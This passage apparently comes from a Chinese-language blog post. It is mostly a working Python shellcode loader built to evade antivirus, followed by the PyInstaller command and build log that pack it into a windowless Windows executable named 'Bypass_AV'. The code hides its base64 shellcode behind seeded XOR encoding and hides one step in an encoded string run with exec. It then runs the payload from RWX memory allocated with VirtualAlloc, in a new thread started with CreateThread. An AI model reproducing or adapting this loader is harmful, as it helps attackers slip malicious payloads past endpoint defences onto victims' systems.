style="color:#393A34">(</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    fs_keys </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;123&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    func_codes </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    random</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">seed</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fs_keys</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    func_code </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> funcs</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;,&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> item </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> func_code</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        item </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">int</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">item</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        func_codes </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">item </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> random</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">randint</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">255</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> func_codes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ShellCode</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">keys</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    random</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">seed</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">keys</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ShellCode_2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> item </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> ShellCode</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ShellCode_2 </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">ord</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">item</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> random</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">randint</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">255</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;,&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ShellCode_2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ShellCode_2</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">strip</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;,&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> ShellCode_2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">run</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ctypes</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">windll</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">kernel32</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">restype</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">ctypes</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">c_uint64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    rwxpage </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ctypes</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">windll</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">kernel32</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x3000</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x40</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    funcs </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;70,208,133,111,226,123,113,146,231,30,133,20,54,203,71,77,230,234,182,55,207,108,203,231,232,79,137,160,182,180,203,54,84,167,78,235,21,203,131,209,183,25,202,144,179,84,168,137,158,181,33,136,154,102,166,98,8,179,139,242,251,26,1,178,19,125,22,209,56,51,119,41,229,118,164,182,74,178,157,53,248,183,48,58,66,179,109,168,30,182,106,60,119,170,147,57,73,4,41,221,62,148,2,9,60,188,167,47,194,232,35,141,240,193,78,169,122,86&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    func </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> fs_decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">exec</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">func</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    handle </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ctypes</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">windll</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">kernel32</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ctypes</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">c_uint64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rwxpage</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ctypes</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">windll</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">kernel32</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">WaitForSingleObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">handle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> __name__ </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;__main__&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ShellCode </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token triple-quoted-string string" style="color:#e3116c">&#x27;&#x27;&#x27;&quot;\x2f\x45\x69\x44\x35\x50\x44\x6f\x7a\x41\x41\x41\x41\x45&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x46\x52\x51\x56\x42\x53\x53\x44\x48\x53\x5a\x55\x69\x4c&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x55\x6d\x42\x52\x53\x49\x74\x53\x47\x45\x69\x4c\x55\x69&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x42\x57\x54\x54\x48\x4a\x53\x41\x2b\x33\x53\x6b\x70\x49&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x69\x33\x4a\x51\x53\x44\x48\x41\x72\x44\x78\x68\x66\x41&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x49\x73\x49\x45\x48\x42\x79\x51\x31\x42\x41\x63\x48\x69&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x37\x56\x4a\x42\x55\x55\x69\x4c\x55\x69\x43\x4c\x51\x6a&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x78\x49\x41\x64\x42\x6d\x67\x58\x67\x59\x43\x77\x49\x50&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x68\x58\x49\x41\x41\x41\x43\x4c\x67\x49\x67\x41\x41\x41&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x42\x49\x68\x63\x42\x30\x5a\x30\x67\x42\x30\x45\x53\x4c&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x51\x43\x43\x4c\x53\x42\x68\x4a\x41\x64\x42\x51\x34\x31&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x5a\x4e\x4d\x63\x6c\x49\x2f\x38\x6c\x42\x69\x7a\x53\x49&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x53\x41\x48\x57\x53\x44\x48\x41\x51\x63\x48\x4a\x44\x61&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x78\x42\x41\x63\x45\x34\x34\x48\x58\x78\x54\x41\x4e\x4d&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x4a\x41\x68\x46\x4f\x64\x46\x31\x32\x46\x68\x45\x69\x30&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x41\x6b\x53\x51\x48\x51\x5a\x6b\x47\x4c\x44\x45\x68\x45&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x69\x30\x41\x63\x53\x51\x48\x51\x51\x59\x73\x45\x69\x45&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x46\x59\x51\x56\x68\x65\x57\x55\x67\x42\x30\x46\x70\x42&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x57\x45\x46\x5a\x51\x56\x70\x49\x67\x2b\x77\x67\x51\x56&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x4c\x2f\x34\x46\x68\x42\x57\x56\x70\x49\x69\x78\x4c\x70&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x53\x2f\x2f\x2f\x2f\x31\x31\x4a\x76\x6e\x64\x7a\x4d\x6c&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x38\x7a\x4d\x67\x41\x41\x51\x56\x5a\x4a\x69\x65\x5a\x49&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x67\x65\x79\x67\x41\x51\x41\x41\x53\x59\x6e\x6c\x53\x62&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x77\x43\x41\x42\x46\x63\x43\x67\x41\x55\x48\x6b\x46\x55&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x53\x59\x6e\x6b\x54\x49\x6e\x78\x51\x62\x70\x4d\x64\x79&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x59\x48\x2f\x39\x56\x4d\x69\x65\x70\x6f\x41\x51\x45\x41&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x41\x46\x6c\x42\x75\x69\x6d\x41\x61\x77\x44\x2f\x31\x57&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x6f\x4b\x51\x56\x35\x51\x55\x45\x30\x78\x79\x55\x30\x78&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x77\x45\x6a\x2f\x77\x45\x69\x4a\x77\x6b\x6a\x2f\x77\x45&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x69\x4a\x77\x55\x47\x36\x36\x67\x2f\x66\x34\x50\x2f\x56&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x53\x49\x6e\x48\x61\x68\x42\x42\x57\x45\x79\x4a\x34\x6b&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x69\x4a\x2b\x55\x47\x36\x6d\x61\x56\x30\x59\x66\x2f\x56&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x68\x63\x42\x30\x43\x6b\x6e\x2f\x7a\x6e\x58\x6c\x36\x4a&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x4d\x41\x41\x41\x42\x49\x67\x2b\x77\x51\x53\x49\x6e\x69&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x54\x54\x48\x4a\x61\x67\x52\x42\x57\x45\x69\x4a\x2b\x55&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x47\x36\x41\x74\x6e\x49\x58\x2f\x2f\x56\x67\x2f\x67\x41&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x66\x6c\x56\x49\x67\x38\x51\x67\x58\x6f\x6e\x32\x61\x6b&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x42\x42\x57\x57\x67\x41\x45\x41\x41\x41\x51\x56\x68\x49&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x69\x66\x4a\x49\x4d\x63\x6c\x42\x75\x6c\x69\x6b\x55\x2b&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x58\x2f\x31\x55\x69\x4a\x77\x30\x6d\x4a\x78\x30\x30\x78&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x79\x55\x6d\x4a\x38\x45\x69\x4a\x32\x6b\x69\x4a\x2b\x55&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x47\x36\x41\x74\x6e\x49\x58\x2f\x2f\x56\x67\x2f\x67\x41&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x66\x53\x68\x59\x51\x56\x64\x5a\x61\x41\x42\x41\x41\x41&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x42\x42\x57\x47\x6f\x41\x57\x6b\x47\x36\x43\x79\x38\x50&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x4d\x50\x2f\x56\x56\x31\x6c\x42\x75\x6e\x56\x75\x54\x57&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x48\x2f\x31\x55\x6e\x2f\x7a\x75\x6b\x38\x2f\x2f\x2f\x2f&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x53\x41\x48\x44\x53\x43\x6e\x47\x53\x49\x58\x32\x64\x62&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x52\x42\x2f\x2b\x64\x59\x61\x67\x42\x5a\x53\x63\x66\x43&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;\x38\x4c\x57\x69\x56\x76\x2f\x56&quot; &#x27;&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    keys </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;Axx8&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    shell_code </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ShellCode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">strip</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">replace</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;&quot;&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">replace</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;\n&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">keys</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    shellcode </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shell_code</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">keys</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    shellcode </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> base64</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">b64decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    run</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>将 python 脚本打包为二进制文件</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS D:\_Code\test&gt; pyinstaller -F -w .\Bypass_AV-20250203.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">227 INFO: PyInstaller: 6.11.0, contrib hooks: 2024.9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">227 INFO: Python: 3.11.8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">234 INFO: Platform: Windows-10-10.0.22631-SP0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">234 INFO: Python environment: D:\_Code\test\env</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">235 INFO: wrote D:\_Code\test\Bypass_AV-20250203.spec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">238 INFO: Module search paths (PYTHONPATH):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[&#x27;D:\\_Code\\test\\env\\Scripts\\pyinstaller.exe&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> &#x27;C:\\Users\\Randark\\AppData\\Local\\Programs\\Python\\Python311\\python311.zip&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> &#x27;C:\\Users\\Randark\\AppData\\Local\\Programs\\Python\\Python311\\DLLs&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> &#x27;C:\\Users\\Randark\\AppData\\Local\\Programs\\Python\\Python311\\Lib&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> &#x27;C:\\Users\\Randark\\AppData\\Local\\Programs\\Python\\Python311&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> &#x27;D:\\_Code\\test\\env&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> &#x27;D:\\_Code\\test\\env\\Lib\\site-packages&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> &#x27;D:\\_Code\\test\\env\\Lib\\site-packages\\win32&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> &#x27;D:\\_Code\\test\\env\\Lib\\site-packages\\win32\\lib&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> &#x27;D:\\_Code\\test\\env\\Lib\\site-packages\\Pythonwin&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> &#x27;D:\\_Code\\test&#x27;]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">601 INFO: checking Analysis</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">601 INFO: Building Analysis because Analysis-00.toc is non existent</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">601 INFO: Running Analysis Analysis-00.toc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">601 INFO: Target bytecode optimization level: 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">601 INFO: Initializing module dependency graph...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">602 INFO: Initializing module graph hook caches...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">622 INFO: Analyzing base_library.zip ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1595 INFO: Processing standard module hook &#x27;hook-heapq.py&#x27; from &#x27;D:\\_Code\\test\\env\\Lib\\site-packages\\PyInstaller\\hooks&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1646 INFO: Processing standard module hook &#x27;hook-encodings.py&#x27; from &#x27;D:\\_Code\\test\\env\\Lib\\site-packages\\PyInstaller\\hooks&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2694 INFO: Processing standard module hook &#x27;hook-pickle.py&#x27; from &#x27;D:\\_Code\\test\\env\\Lib\\site-packages\\PyInstaller\\hooks&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3632 INFO: Caching module dependency graph...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3708 INFO: Looking for Python shared library...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3717 INFO: Using Python shared library: C:\Users\Randark\AppData\Local\Programs\Python\Python311\python311.dll</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3717 INFO: Analyzing D:\_Code\test\Bypass_AV-20250203.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3732 INFO: Processing module hooks (post-graph stage)...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3736 INFO: Performing binary vs. data reclassification (2 entries)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3737 INFO: Looking for ctypes DLLs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3756 INFO: Analyzing run-time hooks ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3757 INFO: Including run-time hook &#x27;pyi_rth_inspect.py&#x27; from &#x27;D:\\_Code\\test\\env\\Lib\\site-packages\\PyInstaller\\hooks\\rthooks&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3761 INFO: Looking for dynamic libraries</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3877 INFO: Extra DLL search directories (AddDllDirectory): []</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3877 INFO: Extra DLL search directories (PATH): []</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4115 INFO: Warnings written to D:\_Code\test\build\Bypass_AV-20250203\warn-Bypass_AV-20250203.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4127 INFO: Graph cross-reference written to D:\_Code\test\build\Bypass_AV-20250203\xref-Bypass_AV-20250203.html</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4147 INFO: checking PYZ</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4147 INFO: Building PYZ because PYZ-00.toc is non existent</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4147 INFO: Building PYZ (ZlibArchive) D:\_Code\test\build\Bypass_AV-20250203\PYZ-00.pyz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4370 INFO: Building PYZ 